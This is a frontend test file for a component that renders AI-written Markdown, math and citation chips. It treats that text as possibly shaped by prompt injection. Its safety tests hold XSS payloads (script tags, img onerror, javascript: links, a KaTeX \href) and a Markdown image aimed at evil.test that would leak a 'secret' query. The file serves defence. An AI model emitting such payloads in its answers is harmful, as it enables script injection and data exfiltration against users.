/**
 * rich-text.test.tsx
 *
 * Answers render as Markdown and math, and the text is untrusted: a model that
 * read an attacker's document wrote it. These tests pin both halves — the
 * structure a learner reads, and the markup the text must never become.
 */
import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { createMemoryRouter, RouterProvider } from "react-router";
import { RichText } from "~/components/rich-text";
import type { Source } from "~/hooks/use-turn-stream";

const sources: Source[] = [
  { kind: "chunk", id: "c1", title: "Chapter 1", page: 3, document_id: "doc-1" },
  { kind: "chunk", id: "c2", title: "Chapter 2", page: 9, document_id: "doc-1" },
  { kind: "url", id: "1", title: "Web page", url: "https://example.org/a" },
];

/** Renders inside a router, because chips are <Link>s. */
function renderRich(text: string, opts: { sources?: Source[]; streaming?: boolean } = {}) {
  const ui = <RichText text={text} sources={opts.sources ?? sources} streaming={opts.streaming} />;
  const router = createMemoryRouter([{ path: "/", element: ui }], { initialEntries: ["/"] });
  return render(<RouterProvider router={router} />).container;
}

/** The chips' visible numbers, in document order. */
function chipNumbers(root: HTMLElement): string[] {
  return [...root.querySelectorAll(".lp-chip [aria-hidden='true']")].map((n) => n.textContent ?? "");
}

describe("RichText structure", () => {
  it("renders a heading, a list and a table as elements", () => {
    const root = renderRich(
      "## Title\n\n- one\n- two\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n~~old~~ **bold**",
    );
    expect(root.querySelector("h2")?.textContent).toBe("Title");
    expect(root.querySelectorAll("li")).toHaveLength(2);
    expect(root.querySelector("table td")?.textContent).toBe("1");
    expect(root.querySelector("del")?.textContent).toBe("old");
    expect(root.textContent).not.toContain("##");
    expect(root.textContent).not.toContain("**");
  });

  it("wraps a table in a sideways-scrolling box", () => {
    const root = renderRich("| a |\n| - |\n| 1 |");
    expect(root.querySelector(".lp-table-scroll > table")).not.toBeNull();
  });

  it("renders inline and block math with KaTeX", () => {
    const root = renderRich("Inline $a^2+b^2$ here.\n\n$$\n\\frac{1}{2}\n$$");
    expect(root.querySelectorAll(".katex").length).toBeGreaterThanOrEqual(2);
    expect(root.querySelector(".katex-display")).not.toBeNull();
    expect(root.textContent).not.toContain("$$");
  });

  it("shows bad LaTeX as its source instead of throwing", () => {
    const root = renderRich("$\\frac{1}{$ and $\\notacommand{x}$");
    expect(root.textContent).toContain("\\notacommand");
  });
});

describe("RichText citations", () => {
  it("places chips inline, numbered by first appearance", () => {
    const root = renderRich(
      "First [[cite:chunk:c2]] then [[cite:url:1]] and again [[cite:chunk:c2]] then [[cite:chunk:c1]].",
    );
    const p = root.querySelector("p");
    expect(p?.querySelectorAll(".lp-chip")).toHaveLength(4);
    expect(chipNumbers(root)).toEqual(["1", "2", "1", "3"]);
    expect(p?.textContent).toMatch(/^First 1Chapter 2p\.9 then 2Web page/);
    expect(root.textContent).not.toContain("[[cite:");
  });

  it("renders nothing for a marker with no known source", () => {
    const root = renderRich("Invented [[cite:chunk:nope]] claim [[cite:chunk:c1]].");
    expect(root.querySelectorAll(".lp-chip")).toHaveLength(1);
    expect(chipNumbers(root)).toEqual(["1"]);
    expect(root.textContent).not.toContain("[[cite:");
    expect(root.textContent).not.toContain("nope");
  });

  it("leaves a marker inside a code span or code block as text", () => {
    const root = renderRich("Write `[[cite:chunk:c1]]` like so.\n\n```\n[[cite:chunk:c2]]\n```");
    expect(root.querySelectorAll(".lp-chip")).toHaveLength(0);
    expect(root.querySelector("p code")?.textContent).toBe("[[cite:chunk:c1]]");
    expect(root.querySelector("pre code")?.textContent).toContain("[[cite:chunk:c2]]");
  });

  it("leaves a marker inside math as the formula's text, not a chip", () => {
    const root = renderRich("$x [[cite:chunk:c1]]$");
    expect(root.querySelectorAll(".lp-chip")).toHaveLength(0);
    expect(root.textContent).not.toContain("⸨");
  });

  it("keeps a chip in emphasis and headings, and moves one out of a link", () => {
    const root = renderRich("## Claim [[cite:chunk:c1]]\n\n*see [[cite:chunk:c2]]* [a [[cite:url:1]]](https://x.test)");
    expect(root.querySelector("h2 .lp-chip")).not.toBeNull();
    expect(root.querySelector("em .lp-chip")).not.toBeNull();
    // No anchor inside an anchor.
    expect(root.querySelector("a a")).toBeNull();
    expect(chipNumbers(root)).toEqual(["1", "2", "3"]);
  });

  it("leaves text that happens to look like a placeholder alone", () => {
    const root = renderRich("A ⸨7⸩ and ⸨c⸩ in the text.");
    expect(root.textContent).toContain("A ⸨7⸩ and ⸨c⸩ in the text.");
  });
});

describe("RichText safety", () => {
  it("never renders raw HTML as elements", () => {
    const root = renderRich('Hi <script>alert(1)</script> <img src=x onerror="alert(2)">\n\n<div>x</div>');
    expect(root.querySelector("script")).toBeNull();
    expect(root.querySelector("img")).toBeNull();
    expect(root.querySelector("div div div")).toBeNull();
    expect(root.querySelector("[onerror]")).toBeNull();
  });

  it("turns an image into a link and never loads it (F-13)", () => {
    const root = renderRich("![x](https://evil.test/?q=secret)");
    expect(root.querySelector("img")).toBeNull();
    const a = root.querySelector("a");
    expect(a).toHaveAttribute("href", "https://evil.test/?q=secret");
    expect(a?.textContent).toBe("[image: x]");
  });

  it("drops a javascript: link", () => {
    const root = renderRich("[click](javascript:alert(1)) and [ok](JAVASCRIPT:alert(2))");
    expect(root.querySelector("a")).toBeNull();
    expect(root.innerHTML).not.toMatch(/javascript:/i);
    expect(root.textContent).toContain("click");
  });

  it("opens an external link in a new tab with no opener", () => {
    const root = renderRich("[site](https://example.org)");
    const a = root.querySelector("a");
    expect(a).toHaveAttribute("target", "_blank");
    expect(a).toHaveAttribute("rel", "noopener noreferrer nofollow");
  });

  it("gives KaTeX no trust: \\href renders no link", () => {
    const root = renderRich("$\\href{javascript:alert(1)}{x}$ $\\url{https://evil.test}$");
    expect(root.querySelector("a")).toBeNull();
  });

  it("caps huge sizes in math instead of hanging or overflowing", () => {
    const root = renderRich("$\\rule{100000em}{100000em}$");
    // The drawn box, not the source annotation (which keeps the TeX as written).
    const drawn = root.querySelector(".katex-html")?.innerHTML ?? "";
    expect(drawn).toContain("10em");
    expect(drawn).not.toContain("100000em");
  });
});

describe("RichText streaming", () => {
  it.each(["## Hea", "$$\\frac{1", "| a | b |\n| -", "**bold", "- [ ] ta", "```js\nconst", "[link](htt", "text [[cite:chu"])(
    "renders the truncated prefix %j without throwing",
    (text) => {
      expect(() => renderRich(text, { streaming: true })).not.toThrow();
    },
  );

  it("shows the caret after the last word while streaming, and not after", () => {
    const live = renderRich("## Hea", { streaming: true });
    expect(live.querySelector("h2 [data-caret]")).not.toBeNull();
    const done = renderRich("## Heading");
    expect(done.querySelector("[data-caret]")).toBeNull();
  });

  it("still shows the caret when the text ends inside math or code", () => {
    const root = renderRich("$$\\frac{1", { streaming: true });
    expect(root.querySelectorAll("[data-caret]")).toHaveLength(1);
    expect(root.textContent).not.toContain("⸨");
  });
});

describe("answer surfaces", () => {
  it("renders the assistant's Markdown in chat but keeps the learner's message plain", async () => {
    const { MessageList } = await import("~/components/chat/message-list");
    const { initI18n } = await import("~/lib/i18n");
    initI18n("en");
    const ui = (
      <MessageList
        turns={[
          { id: "u", role: "user", content: "## my **own** words", sources: [] },
          { id: "a", role: "assistant", content: "## Answer\n\nIt is $x^2$ [[cite:chunk:c1]].", sources },
        ]}
      />
    );
    const router = createMemoryRouter([{ path: "/", element: ui }], { initialEntries: ["/"] });
    const root = render(<RouterProvider router={router} />).container;
    const [user, assistant] = [...root.querySelectorAll("ol > li")];
    expect(user?.textContent).toContain("## my **own** words");
    expect(user?.querySelector("h2, strong")).toBeNull();
    expect(assistant?.querySelector("h2")?.textContent).toBe("Answer");
    expect(assistant?.querySelector(".katex")).not.toBeNull();
    expect(assistant?.querySelectorAll(".lp-chip")).toHaveLength(1);
  });

  it("renders a solve or research body through the same renderer", async () => {
    const { CitedBody } = await import("~/components/research/cited-body");
    const ui = <CitedBody text={"# Report\n\n| k | v |\n| - | - |\n| a | 1 |"} sources={sources} streaming />;
    const router = createMemoryRouter([{ path: "/", element: ui }], { initialEntries: ["/"] });
    const root = render(<RouterProvider router={router} />).container;
    expect(root.querySelector(".lp-rich h1")?.textContent).toBe("Report");
    expect(root.querySelector("table")).not.toBeNull();
    expect(root.querySelectorAll("[data-caret]")).toHaveLength(1);
  });
});

describe("RichText tables", () => {
  it("does not number a chip in a cell past the header's columns", () => {
    const root = renderRich("| a |\n| - |\n| x | [[cite:chunk:c2]] |\n\nThen [[cite:chunk:c1]].");
    expect(chipNumbers(root)).toEqual(["1"]);
  });
});
